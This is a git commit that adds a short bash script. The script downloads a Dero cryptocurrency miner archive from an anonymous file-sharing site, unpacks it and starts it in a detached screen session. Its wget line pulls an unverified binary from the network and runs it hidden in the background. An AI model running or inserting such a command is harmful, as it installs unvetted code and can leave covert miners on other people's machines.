1a3f41e3f61e908cfa134eeb9f8f3e2a6e9edbcf
recepatilga <117754976+recepatilga@users.noreply.github.com>
2022-11-27 03:20:29 +0300

    Create dero.sh

---
+++ dero.sh
@@ -0,0 +1,7 @@
+#!/bin/bash
+sudo apt update
+sudo apt install screen -y
+wget wget https://www.dosyaupload.com/4OEHd/dero_linux_amd64.tar.gz
+tar -xvf dero_linux_amd64.tar.gz
+cd dero_linux_amd64
+screen -dmS run ./dero-miner.sh
